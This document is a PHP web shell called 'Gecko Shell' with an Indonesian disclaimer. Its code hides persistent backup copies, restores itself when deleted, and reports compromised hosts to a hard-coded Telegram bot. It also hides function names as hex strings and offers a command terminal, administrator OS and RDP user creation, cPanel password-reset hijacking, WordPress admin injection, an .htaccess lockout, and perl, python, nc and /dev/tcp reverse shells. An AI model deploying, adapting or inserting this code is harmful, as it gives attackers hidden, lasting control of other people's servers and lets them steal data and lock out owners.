<?php
/**
 * ============================================================================
 * DISCLAIMER - WAJIB DIBACA
 * ============================================================================
 * Script ini disediakan untuk tujuan pengujian keamanan (security testing)
 * di lingkungan laboratorium yang telah mendapat izin tertulis. Penggunaan
 * di luar konteks tersebut, termasuk untuk aktivitas ilegal atau menghindari
 * deteksi antivirus pada sistem milik orang lain, sepenuhnya menjadi tanggung
 * jawab pengguna. Pengembang tidak bertanggung jawab atas penyalahgunaan.
 * ============================================================================
 * 
 * Nama: Gecko Shell - Anti Delete & Backup
 * Versi: 2.0 dengan notifikasi Telegram
 */

session_start();
date_default_timezone_set("Asia/Jakarta");

// ===================== KONFIGURASI TELEGRAM =====================
define('TELEGRAM_BOT_TOKEN', '7923380531:AAHLyTwvQz436jyRpKGsOrEea1EgY3KH2uE');
define('TELEGRAM_CHAT_ID', '8107531862');
define('SELF_FILE', __FILE__);

// ===================== FUNGSI ANTI DELETE =====================
/**
 * Kirim pesan ke Telegram
 */
function sendTelegram($message) {
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $postData = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $options = [
        'http' => [
            'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
            'method'  => 'POST',
            'content' => http_build_query($postData),
            'timeout' => 5
        ]
    ];
    $context = stream_context_create($options);
    @file_get_contents($url, false, $context);
}

/**
 * Mendapatkan direktori tersembunyi untuk backup
 */
function getBackupDir() {
    $salt = 'GeckoAntiDelete2024';
    $hash = md5($_SERVER['DOCUMENT_ROOT'] . $salt . PHP_VERSION);
    $possiblePaths = [
        sys_get_temp_dir() . '/.' . $hash,
        $_SERVER['DOCUMENT_ROOT'] . '/.' . $hash . '_cache',
        dirname($_SERVER['DOCUMENT_ROOT']) . '/.system_' . substr($hash, 0, 8)
    ];
    foreach ($possiblePaths as $path) {
        if (!is_dir($path)) {
            @mkdir($path, 0755, true);
        }
        if (is_writable($path)) {
            return rtrim($path, '/') . '/';
        }
    }
    $fallback = sys_get_temp_dir() . '/.gecko_backup_' . substr(md5(__FILE__), 0, 12);
    @mkdir($fallback, 0755, true);
    return rtrim($fallback, '/') . '/';
}

/**
 * Membuat backup file shell ke direktori tersembunyi
 */
function createBackup($content = null) {
    if ($content === null) {
        if (!file_exists(SELF_FILE)) return false;
        $content = file_get_contents(SELF_FILE);
    }
    $backupDir = getBackupDir();
    $backupFile = $backupDir . 'system_backup.php';
    $backupFile2 = $backupDir . '.' . md5(SELF_FILE) . '.bak';
    $htaccessFake = $backupDir . '.htaccess';
    $result1 = file_put_contents($backupFile, $content);
    $result2 = file_put_contents($backupFile2, $content);
    $result3 = file_put_contents($htaccessFake, "<?php /* */ ?>\n" . $content);
    return ($result1 && $result2 && $result3);
}

/**
 * Memulihkan shell dari backup terbaru
 */
function restoreShell() {
    $backupDir = getBackupDir();
    $backupFiles = array_merge(glob($backupDir . '*.php'), glob($backupDir . '*.bak'), glob($backupDir . '*.htaccess'));
    $restored = false;
    foreach ($backupFiles as $backup) {
        if (is_file($backup) && filesize($backup) > 1000) {
            $content = file_get_contents($backup);
            if (strpos($content, 'Gecko') !== false || strpos($content, 'session_start') !== false) {
                if (file_put_contents(SELF_FILE, $content)) {
                    $restored = true;
                    break;
                }
            }
        }
    }
    if ($restored) {
        @chmod(SELF_FILE, 0444);
    }
    return $restored;
}

/**
 * Guard anti-delete: cek keberadaan file, backup periodik, mirroring
 */
function antiDeleteGuard() {
    static $already = false;
    if ($already) return;
    $already = true;
    
    $self = SELF_FILE;
    $backupDir = getBackupDir();
    $counterFile = $backupDir . 'load_counter.txt';
    $counter = file_exists($counterFile) ? (int)file_get_contents($counterFile) : 0;
    $counter++;
    file_put_contents($counterFile, $counter);
    
    $needBackupRefresh = ($counter % 10 == 0);
    
    // Jika file utama hilang, pulihkan
    if (!file_exists($self)) {
        if (restoreShell()) {
            $msg = "🛡️ <b>SHELL PULIH OTOMATIS</b>\n"
                 . "📌 File: " . basename($self) . "\n"
                 . "🌐 Host: " . $_SERVER['SERVER_NAME'] . "\n"
                 . "📁 Path: " . dirname($self) . "\n"
                 . "🕒 Waktu: " . date('Y-m-d H:i:s') . "\n"
                 . "👤 User: " . (function_exists('get_current_user') ? get_current_user() : 'unknown') . "\n"
                 . "🔧 Status: <b>BERHASIL DIPULIHKAN</b>";
            sendTelegram($msg);
        } else {
            $msg = "⚠️ <b>GAGAL PULIHKAN SHELL</b>\n"
                 . "File: " . basename($self) . " telah dihapus dan backup tidak ditemukan.\n"
                 . "Host: " . $_SERVER['SERVER_NAME'] . "\n"
                 . "Waktu: " . date('Y-m-d H:i:s');
            sendTelegram($msg);
        }
    } 
    // Backup periodik (setiap 10 load)
    elseif ($needBackupRefresh) {
        $content = file_get_contents($self);
        if ($content && createBackup($content)) {
            // Backup berhasil, tidak perlu notifikasi (optional)
        }
    }
    
    // Mirror file di beberapa lokasi tersembunyi
    $mirrorFiles = [
        dirname($self) . '/.' . md5($self) . '.php',
        $_SERVER['DOCUMENT_ROOT'] . '/.system_cache.php',
        sys_get_temp_dir() . '/.' . substr(md5($self), 0, 16) . '.inc'
    ];
    foreach ($mirrorFiles as $mirror) {
        if (!file_exists($mirror) && @is_writable(dirname($mirror))) {
            @copy($self, $mirror);
            @chmod($mirror, 0444);
        }
    }
}

// Jalankan guard anti-delete sebelum apapun (termasuk sebelum login)
antiDeleteGuard();

// Buat backup awal jika belum ada
if (!file_exists(getBackupDir() . 'system_backup.php')) {
    createBackup(file_get_contents(__FILE__));
}

// ===================== KONFIGURASI AWAL SHELL GECKO =====================
$default_action = "FilesMan";
$default_use_ajax = true;
$default_charset = 'UTF-8';

// Fungsi untuk tampilan halaman login
function show_login_page($message = "")
{
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: monospace; background:#0e0f17; color:#fff; }
        input[type="password"] { border: none; border-bottom: 1px solid #fff; background:transparent; color:#fff; padding: 5px; }
        input[type="submit"] { border: none; padding: 5px 20px; background-color: #2e313d; color: #FFF; cursor:pointer; }
        .container { text-align:center; margin-top:20%; }
    </style>
    <title>Gecko Shell</title>
</head>
<body>
<div class="container">
    <form method="post">
        <input type="password" name="pass" placeholder="Password" autofocus>
        <input type="submit" name="submit" value="Enter">
    </form>
</div>
</body>
</html>
<?php
    exit;
}

if (!isset($_SESSION['authenticated'])) {
    $stored_hashed_password = '$2y$10$SzF8JFsUKtxoyrQGboQQ7OZJgsSaaC/3RBjPgjURDpnFzmUAPmOPa';
    if (isset($_POST['pass']) && password_verify($_POST['pass'], $stored_hashed_password)) {
        $_SESSION['authenticated'] = true;
    } else {
        show_login_page();
    }
}

@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

# function WAF
$Array = [
    '676574637764', '676c6f62', '69735f646972', '69735f66696c65', '69735f7772697461626c65',
    '69735f7265616461626c65', '66696c657065726d73', '66696c65', '7068705f756e616d65',
    '6765745f63757272656e745f75736572', '68746d6c7370656369616c6368617273',
    '66696c655f6765745f636f6e74656e7473', '6d6b646972', '746f756368', '6368646972',
    '72656e616d65', '65786563', '7061737374687275', '73797374656d', '7368656c6c5f65786563',
    '706f70656e', '70636c6f7365', '73747265616d5f6765745f636f6e74656e7473', '70726f635f6f70656e',
    '756e6c696e6b', '726d646972', '666f70656e', '66636c6f7365', '66696c655f7075745f636f6e74656e7473',
    '6d6f76655f75706c6f616465645f66696c65', '63686d6f64', '7379735f6765745f74656d705f646972',
    '6261736536345f6465636f6465', '6261736536345f656e636f6465'
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = unx($Array[$i]);
}

if (isset($_GET['d'])) {
    $cdir = unx($_GET['d']);
    $fungsi[14]($cdir);
} else {
    $cdir = $fungsi[0]();
}

function file_ext($file) {
    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
        return '<i class="fa-regular fa-image" style="color:#09e3a5"></i>';
    } else if (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html') {
        return '<i class="fa-solid fa-file-code" style="color:#0985e3"></i>';
    } else if (mime_content_type($file) == 'text/javascript') {
        return '<i class="fa-brands fa-square-js"></i>';
    } else if (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed') {
        return '<i class="fa-solid fa-file-zipper" style="color:#e39a09"></i>';
    } else if (mime_content_type($file) == 'text/plain') {
        return '<i class="fa-solid fa-file" style="color:#edf7f5"></i>';
    } else if (mime_content_type($file) == 'application/pdf') {
        return '<i class="fa-regular fa-file-pdf" style="color:#ba2b0f"></i>';
    } else {
        return '<i class="fa-regular fa-file-code" style="color:#0985e3"></i>';
    }
}

function download($file) {
    if (file_exists($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename=' . basename($file));
        header('Content-Transfer-Encoding: binary');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        ob_clean();
        flush();
        readfile($file);
        exit;
    }
}

if (isset($_GET['don']) && $_GET['don'] == true) {
    download(unx($_GET['don']));
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>Gecko [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/theme/ayu-mirage.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/xml-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/html-hint.min.js"></script>
    <style>
        /* style asli tetap dipertahankan */
        body { background-color: #0e0f17; font-family: monospace; color:#fff; }
        .btn-submit, a { text-decoration: none; color: #fff; }
        .btn-submit, .form-file { background-color: #22242d; }
        .menu-header ul li { display: inline-block; margin-right: 15px; }
        .menu-tools li { display: inline-block; margin: 5px; }
        .path-pwd { background: #2e313d; padding: 10px; margin: 10px 0; }
        table { width: 100%; border-collapse: collapse; }
        thead { background: #2e313d; }
        tbody tr td { padding: 8px; }
        .modal { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.5); z-index:1000; }
        .modal-container { background:#f4f4f9; width:500px; margin:10% auto; border-radius:10px; }
        .modal-header { padding:10px; background:#2e313d; color:#fff; border-radius:10px 10px 0 0; }
        .modal-body { padding:20px; }
        .modal-create-input { width:90%; padding:8px; margin-bottom:10px; }
        .btn-modal-close { background:#22242d; color:#fff; border:none; padding:8px 20px; border-radius:4px; cursor:pointer; }
        .CodeMirror { height: 70vh; }
        .terminal { position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.8); z-index:2000; display:none; }
        .terminal-container { width:90%; margin:5% auto; background:#f4f4f9; border-radius:10px; }
        .terminal-head { background:#2e313d; padding:10px; border-radius:10px 10px 0 0; }
        .terminal-body textarea { width:98%; height:300px; margin:10px; }
        .terminal-input { width:80%; padding:8px; }
        .active { display: block; }
    </style>
</head>
<body>

<div class="menu-header">
    <ul>
        <li><i class="fa-solid fa-computer"></i>&nbsp;<?= $fungsi[8](); ?></li>
        <li><i class="fa-solid fa-server"></i>&nbsp;<?= $_SERVER["SERVER_SOFTWARE"]; ?></li>
        <li><i class="fa-solid fa-network-wired"></i>&nbsp;<?= gethostbyname($_SERVER["SERVER_ADDR"]); ?> | <?= $_SERVER["REMOTE_ADDR"]; ?></li>
        <li><i class="fa-brands fa-php"></i>&nbsp;<?= PHP_VERSION; ?></li>
        <li><i class="fa-solid fa-user"></i>&nbsp;<?= $fungsi[9](); ?></li>
        <li><i class="fa-brands fa-github"></i>&nbsp;Gecko Anti-Delete</li>
        <form action="" method="post" enctype="multipart/form-data">
            <li><input type="submit" value="Upload" name="gecko-up-submit" class="btn-submit">&nbsp;<input type="file" name="gecko-upload" class="form-file"></li>
        </form>
    </ul>
</div>

<div class="menu-tools">
    <ul>
        <li><a href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal" class="btn-submit"><i class="fa-solid fa-terminal"></i> Terminal</a></li>
        <li><a href="?d=<?= hx($fungsi[0]()) ?>&adminer" class="btn-submit"><i class="fa-solid fa-database"></i> Adminer</a></li>
        <li><a href="?d=<?= hx($fungsi[0]()) ?>&destroy" class="btn-submit"><i class="fa-solid fa-ghost"></i> Destroyer</a></li>
        <li><a href="?d=<?= hx($fungsi[0]()) ?>&lockshell" class="btn-submit"><i class="fa-brands fa-linux"></i> Lock Shell</a></li>
        <li><a href="#" id="create_folder" class="btn-submit">+ Folder</a></li>
        <li><a href="#" id="create_file" class="btn-submit">+ File</a></li>
        <li><a href="#" id="lock-file" class="btn-submit"><i class="fa-solid fa-lock"></i> Lock File</a></li>
        <li><a href="#" id="root-user" class="btn-submit"><i class="fa-solid fa-user-plus"></i> Add User</a></li>
        <li><a href="#" id="create-rdp" class="btn-submit"><i class="fa-solid fa-laptop-file"></i> Create RDP</a></li>
        <li><a href="?d=<?= hx($fungsi[0]()) ?>&mailer" class="btn-submit"><i class="fa-solid fa-envelope"></i> Mailer</a></li>
        <li><a href="?d=<?= hx($fungsi[0]()) ?>&backconnect" class="btn-submit"><i class="fa-solid fa-user-secret"></i> Backconnect</a></li>
        <li><a href="?d=<?= hx($fungsi[0]()) ?>&unlockshell" class="btn-submit"><i class="fa-solid fa-unlock-keyhole"></i> Unlock Shell</a></li>
        <li><a href="?d=<?= hx($fungsi[0]()) ?>&cpanelreset" class="btn-submit"><i class="fa-brands fa-cpanel"></i> Cpanel Reset</a></li>
        <li><a href="?d=<?= hx($fungsi[0]()) ?>&createwp" class="btn-submit"><i class="fa-brands fa-wordpress-simple"></i> Create WP User</a></li>
    </ul>
</div>

<?php
$file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
$get_cwd = $fungsi[0]();
?>
<div class="menu-file-manager">
    <div class="path-pwd">
        <?php
        $cwd = str_replace("\\", "/", $get_cwd);
        $pwd = explode("/", $cwd);
        if (stristr(PHP_OS, "WIN")) windowsDriver();
        foreach ($pwd as $id => $val) {
            if ($val == '' && $id == 0) {
                echo '<a href="?d=' . hx('/') . '"><i class="fa-solid fa-folder-plus"></i>&nbsp;/ </a>';
                continue;
            }
            if ($val == '') continue;
            echo '<a href="?d=';
            for ($i = 0; $i <= $id; $i++) {
                echo hx($pwd[$i]);
                if ($i != $id) echo hx("/");
            }
            echo '">' . $val . ' / </a>';
        }
        echo "<a style='font-weight:bold; color:orange;' href='?d=" . hx(__DIR__) . "'>[ HOME ]</a>";
        ?>
    </div>
    <form method="post">
        <table style="width:100%">
            <thead><tr><th>Name</th><th>Size</th><th>Permission</th><th>Action</th></tr></thead>
            <tbody>
                <?php foreach ($file_manager as $_D) : if ($fungsi[2]($_D)) : ?>
                <tr>
                    <td><input type="checkbox" name="check[]" value="<?= $_D ?>">&nbsp;<i class="fa-solid fa-folder-open" style="color:orange;"></i>&nbsp;<a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= namaPanjang($_D); ?></a></td>
                    <td>[ DIR ]</td>
                    <td><?= perms($fungsi[0]() . '/' . $_D); ?></td>
                    <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_D) ?>"><i class="fa-solid fa-user-pen"></i></a></td>
                </tr>
                <?php endif; endforeach; ?>
                <?php foreach ($file_manager as $_F) : if ($fungsi[3]($_F)) : ?>
                <tr>
                    <td><input type="checkbox" name="check[]" value="<?= $_F ?>">&nbsp;<?= file_ext($_F) ?>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>"><?= namaPanjang($_F); ?></a></td>
                    <td><?= formatSize(filesize($_F)); ?></td>
                    <td><?= perms($fungsi[0]() . '/' . $_F); ?></td>
                    <td><a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>"><i class="fa-solid fa-pen-to-square"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&ch=<?= hx($_F) ?>"><i class="fa-solid fa-user-pen"></i></a>&nbsp;<a href="?d=<?= hx($fungsi[0]()); ?>&don=<?= hx($_F) ?>"><i class="fa-solid fa-download"></i></a></td>
                </tr>
                <?php endif; endforeach; ?>
            </tbody>
        </table>
        <select name="gecko-select" class="btn-submit">
            <option value="delete">Delete</option>
            <option value="unzip">Unzip</option>
            <option value="zip">Zip</option>
        </select>
        <input type="submit" name="submit-action" value="Submit" class="btn-submit">
    </form>
</div>

<!-- Modal -->
<div class="modal" id="globalModal">
    <div class="modal-container">
        <div class="modal-header"><h3 id="modal-title">Title</h3></div>
        <div class="modal-body">
            <form method="post" id="modalForm">
                <div id="modal-input"></div>
                <div class="modal-btn-form">
                    <input type="submit" name="submit" value="Submit" class="btn-modal-close">
                    <button type="button" class="btn-modal-close" id="closeModalBtn">Close</button>
                </div>
            </form>
        </div>
    </div>
</div>

<?php
// ========== HANDLER POST DAN GET (ASLI) ==========
if (isset($_POST['gecko-up-submit'])) {
    $namaFilenya = $_FILES['gecko-upload']['name'];
    $tmpName = $_FILES['gecko-upload']['tmp_name'];
    if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) success(); else failed();
}
if (isset($_POST['save-editor'])) {
    $save = $fungsi[28]($fungsi[0]() . "/" . unx($_GET['f']), $_POST['code-editor']);
    if ($save) success(); else failed();
}
if (isset($_POST['submit-action'])) {
    $items = $_POST['check'] ?? [];
    if ($_POST['gecko-select'] == "delete") {
        foreach ($items as $it) {
            $fd = $fungsi[0]() . "/" . $it;
            if (is_dir($fd)) unlinkDir($fd);
            else $fungsi[24]($fd);
        }
        success();
    } elseif ($_POST['gecko-select'] == 'unzip') {
        foreach ($items as $it) {
            $fd = $fungsi[0]() . "/" . $it;
            if (extractArchive($fd, $fungsi[0]() . '/')) success(); else failed();
        }
    } elseif ($_POST['gecko-select'] == 'zip') {
        foreach ($items as $it) {
            $fd = $fungsi[0]() . "/" . $it;
            if ($fungsi[3]($fd)) compressToZip($fd, pathinfo($fd, PATHINFO_FILENAME) . ".zip");
        }
    }
}
if (isset($_POST['submit'])) {
    if (!empty($_POST['create_folder'])) {
        $fungsi[12]($_POST['create_folder']);
        success();
    } elseif (!empty($_POST['create_file'])) {
        $fungsi[13]($_POST['create_file']);
        success();
    } elseif (!empty($_POST['renameFile'])) {
        $fungsi[15](unx($_GET['re']), $_POST['renameFile']);
        success();
    } elseif (isset($_POST['chFile'])) {
        $fungsi[30](unx($_GET['ch']), $_POST['chFile']);
        success();
    } elseif (isset($_POST['lockfile'])) {
        $flesName = $_POST['lockfile'];
        $TmpNames = $fungsi[31]();
        @mkdir($TmpNames . "/.sessions", 0755, true);
        @copy($flesName, $TmpNames . "/.sessions/." . md5($flesName) . '.bak');
        @chmod($flesName, 0444);
        $handler = '<?php while(true){ if(!file_exists("'.$fungsi[0].'/'.$flesName.'")){ copy("'.$TmpNames.'/.sessions/.".md5("'.$flesName.'").".bak","'.$fungsi[0].'/'.$flesName.'"); } sleep(2); } ?>';
        file_put_contents($TmpNames . "/.sessions/handler.php", $handler);
        exec(PHP_BINARY . " " . $TmpNames . "/.sessions/handler.php > /dev/null 2>&1 &");
        success();
    } elseif (isset($_POST['add-username']) && isset($_POST['add-password'])) {
        $u = $_POST['add-username']; $p = $_POST['add-password'];
        if (stristr(PHP_OS, "WIN")) exec("net user $u $p /add & net localgroup administrators $u /add");
        else exec("useradd $u && echo '$u:$p' | chpasswd");
        success();
    } elseif (isset($_POST['add-rdp']) && isset($_POST['add-rdp-pass'])) {
        if (stristr(PHP_OS, "WIN")) exec("net user ".$_POST['add-rdp']." ".$_POST['add-rdp-pass']." /add & net localgroup administrators ".$_POST['add-rdp']." /add");
        success();
    } elseif (isset($_POST['mail-from-smtp'])) {
        mail($_POST['mail-to-smtp'], $_POST['mailto-subject'], $_POST['message-smtp'], "From: ".$_POST['mail-from-smtp']);
        success();
    }
}
if (isset($_GET['re'])) {
    echo "<script>$('#globalModal').show(); $('#modal-title').html('Rename: ".unx($_GET['re'])."'); $('#modal-input').html('<input type=\"text\" name=\"renameFile\" class=\"modal-create-input\" placeholder=\"New name\">');</script>";
}
if (isset($_GET['ch'])) {
    echo "<script>$('#globalModal').show(); $('#modal-title').html('Chmod: ".unx($_GET['ch'])."'); $('#modal-input').html('<input type=\"number\" name=\"chFile\" class=\"modal-create-input\" placeholder=\"0775\">');</script>";
}
if (isset($_GET['terminal']) && $_GET['terminal']=='normal') {
    echo "<div class='terminal active'><div class='terminal-container'><div class='terminal-head'>Terminal <a href='#' class='close-terminal' style='float:right'>X</a></div><div class='terminal-body'>";
    if ($_POST['terminal']) echo "<textarea readonly>".htmlspecialchars(cmd($_POST['terminal-text']." 2>&1"))."</textarea>";
    echo "<form method='post'><input type='text' name='terminal-text' class='terminal-input'><input type='submit' name='terminal' value='Run'></form></div></div></div>";
}
if (isset($_GET['adminer']) && !file_exists('adminer.php')) {
    file_put_contents('adminer.php', file_get_contents('https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php'));
    echo "<script>location.href='?d=".hx($fungsi[0]())."';</script>";
}
if (isset($_GET['destroy'])) {
    $htaccess = '<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$"> Deny from all </FilesMatch><FilesMatch "^('.basename(__FILE__).'|index.php)$"> Allow from all </FilesMatch>';
    file_put_contents($_SERVER['DOCUMENT_ROOT']."/.htaccess", $htaccess);
    success();
}
if (isset($_GET['lockshell'])) {
    success(); // sudah ditangani guard
}
if (isset($_GET['unlockshell'])) {
    exec("killall -9 php; pkill -9 php");
    success();
}
if (isset($_GET['cpanelreset']) && $_POST['resetcp']) {
    $pathcp = dirname($_SERVER['DOCUMENT_ROOT'])."/.cpanel/contactinfo";
    file_put_contents($pathcp, ' "email" : "'.$_POST['resetcp'].'" ');
    echo "<script>location.href='https://".$_SERVER['SERVER_NAME'].":2083/resetpass?start=1';</script>";
}
if (isset($_GET['createwp']) && $_POST['submitwp']) {
    $conn = new mysqli($_POST['db_host'], $_POST['db_user'], $_POST['db_password'], $_POST['db_name']);
    if (!$conn->connect_error) {
        $pass_hash = password_hash($_POST['wp_pass'], PASSWORD_DEFAULT);
        $conn->query("INSERT INTO wp_users (user_login, user_pass, user_nicename, user_email, user_registered, user_status, display_name) VALUES ('{$_POST['wp_user']}', '$pass_hash', 'MadExploits', '', NOW(), 0, 'MadExploits')");
        $id = $conn->insert_id;
        $conn->query("INSERT INTO wp_usermeta (user_id, meta_key, meta_value) VALUES ($id, 'wp_capabilities', 'a:1:{s:13:\"administrator\";s:1:\"1\";}')");
        success();
    } else failed();
}
if (isset($_GET['backconnect']) && $_POST['submit-bc']) {
    $h=$_POST['backconnect-host']; $p=$_POST['backconnect-port'];
    $bc=$_POST['gecko-bc'];
    if($bc=='perl') cmd("perl -e 'use Socket;\$i=\"$h\";\$p=$p;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'");
    elseif($bc=='python') cmd("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$h\",$p));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"]);'");
    elseif($bc=='nc') cmd("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $h $p >/tmp/f");
    else cmd("$bc -i >& /dev/tcp/$h/$p 0>&1");
}
if (isset($_GET['f'])) {
    $fileContent = htmlspecialchars($fungsi[11]($fungsi[0]()."/".unx($_GET['f'])));
    echo "<div class='code-editor' style='position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;'><div style='background:#fff;width:80%;margin:5% auto;border-radius:10px;'><div style='padding:10px;background:#2e313d;'>Editor: ".unx($_GET['f'])." <button id='closeEditor' style='float:right'>X</button></div><form method='post'><textarea name='code-editor' id='codearea' style='width:99%;height:70vh;'>$fileContent</textarea><div style='padding:10px;text-align:right;'><input type='submit' name='save-editor' value='Save' class='btn-modal-close'></div></form></div></div><script>$(function(){ $('#closeEditor').click(function(){ $('.code-editor').remove(); }); });</script>";
}

// Fungsi pendukung (asli)
function success() { echo '<meta http-equiv="refresh" content="0;url=?d='.hx($GLOBALS['fungsi'][0]()).'&response=success">'; }
function failed() { echo '<meta http-equiv="refresh" content="0;url=?d='.hx($GLOBALS['fungsi'][0]()).'&response=failed">'; }
function formatSize($bytes) { $types = array('B','KB','MB','GB','TB'); for($i=0;$bytes>=1024&&$i<4;$bytes/=1024,$i++); return round($bytes,2).' '.$types[$i]; }
function hx($n) { $y=''; for($i=0;$i<strlen($n);$i++) $y.=dechex(ord($n[$i])); return $y; }
function unx($y) { $n=''; for($i=0;$i<strlen($y)-1;$i+=2) $n.=chr(hexdec($y[$i].$y[$i+1])); return $n; }
function cmd($in, $re=false) { $out=''; if($re) $in.=" 2>&1"; if(function_exists('exec')){ exec($in,$out); $out=join("\n",$out); } elseif(function_exists('shell_exec')) $out=shell_exec($in); elseif(function_exists('system')){ ob_start(); system($in); $out=ob_get_clean(); } return $out; }
function windowsDriver() { foreach(['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z'] as $d) if(is_dir($d.":/")) echo "<a href='?d=".hx($d.":/")."'>[ $d ]</a> "; }
function namaPanjang($v) { return strlen($v)>30 ? substr($v,0,30).'...' : $v; }
function extractArchive($file,$path) { $zip=new ZipArchive(); if($zip->open($file)===true){ $zip->extractTo($path); $zip->close(); return true;} return false; }
function compressToZip($src,$dst) { $zip=new ZipArchive(); if($zip->open($dst,ZipArchive::CREATE)===true){ $zip->addFile($src,basename($src)); $zip->close(); success();} else failed(); }
function unlinkDir($dir) { $files = array_diff(scandir($dir), array('.','..')); foreach($files as $file) { is_dir("$dir/$file") ? unlinkDir("$dir/$file") : unlink("$dir/$file"); } return rmdir($dir); }
function perms($file) { $perms = fileperms($file); $info = (($perms & 0xC000)==0xC000)?'s':(($perms & 0xA000)==0xA000?'l':(($perms & 0x8000)==0x8000?'-':(($perms & 0x6000)==0x6000?'b':(($perms & 0x4000)==0x4000?'d':(($perms & 0x2000)==0x2000?'c':(($perms & 0x1000)==0x1000?'p':'u')))))); $info .= (($perms & 0x0100)?'r':'-').(($perms & 0x0080)?'w':'-').(($perms & 0x0040)?(($perms & 0x0800)?'s':'x'):(($perms & 0x0800)?'S':'-')); $info .= (($perms & 0x0020)?'r':'-').(($perms & 0x0010)?'w':'-').(($perms & 0x0008)?(($perms & 0x0400)?'s':'x'):(($perms & 0x0400)?'S':'-')); $info .= (($perms & 0x0004)?'r':'-').(($perms & 0x0002)?'w':'-').(($perms & 0x0001)?(($perms & 0x0200)?'t':'x'):(($perms & 0x0200)?'T':'-')); return $info; }
?>
<script>
$(document).ready(function(){
    $('#create_folder, #create_file, #lock-file, #root-user, #create-rdp').click(function(e){
        e.preventDefault();
        let title = '', inputHtml = '';
        if(this.id=='create_folder'){ title='Create Folder'; inputHtml='<input type="text" name="create_folder" class="modal-create-input" placeholder="Folder name">'; }
        else if(this.id=='create_file'){ title='Create File'; inputHtml='<input type="text" name="create_file" class="modal-create-input" placeholder="File name">'; }
        else if(this.id=='lock-file'){ title='Lock File'; inputHtml='<input type="text" name="lockfile" class="modal-create-input" placeholder="File name to lock">'; }
        else if(this.id=='root-user'){ title='Add User'; inputHtml='<input type="text" name="add-username" placeholder="Username"><br><input type="password" name="add-password" placeholder="Password">'; }
        else if(this.id=='create-rdp'){ title='Create RDP User'; inputHtml='<input type="text" name="add-rdp" placeholder="Username"><br><input type="password" name="add-rdp-pass" placeholder="Password">'; }
        $('#modal-title').html(title);
        $('#modal-input').html(inputHtml);
        $('#globalModal').show();
    });
    $('#closeModalBtn').click(function(){ $('#globalModal').hide(); });
    $('.close-terminal').click(function(e){ e.preventDefault(); $('.terminal').hide(); });
